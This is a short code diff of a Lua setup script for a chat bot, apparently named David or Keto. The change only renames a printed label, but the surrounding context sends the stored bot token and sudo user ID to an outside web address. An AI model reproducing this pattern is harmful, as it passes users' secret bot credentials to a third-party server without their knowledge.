@@ -67,7 +67,7 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://apiabs.ml/config.php?Get=David&DevId='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write")))
-print("::David::")
+print("::Keto::")
 local RunBot = io.open("Keto", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
